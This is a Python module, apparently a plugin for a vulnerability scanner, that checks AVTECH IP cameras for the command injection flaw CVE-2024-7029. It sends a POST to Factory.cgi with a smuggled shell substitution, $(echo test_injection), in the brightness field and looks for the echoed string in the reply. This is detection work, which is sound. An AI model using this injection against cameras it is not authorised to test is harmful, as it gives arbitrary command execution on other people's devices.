"""Agent Asteroid implementation for CVE-2024-7029"""

import re

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "AVTECH IP camera Devices Command Injection Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2024-7029"
VULNERABILITY_DESCRIPTION = (
    "AVTECH IP camera devices contain a command injection vulnerability in the web interface, "
    "allowing an attacker to execute arbitrary commands on the system."
)
RISK_RATING = "CRITICAL"


@exploits_registry.register
class CVE20247029Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(
        method="POST",
        path="/cgi-bin/supervisor/Factory.cgi",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=b"action=white_led&brightness=$(echo test_injection)",
    )
    accept_pattern = [
        re.compile(
            "This machine is not supported, please visit 'www.avtech.com.tw' for more details."
        )
    ]
    match_pattern = [re.compile("test_injection")]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
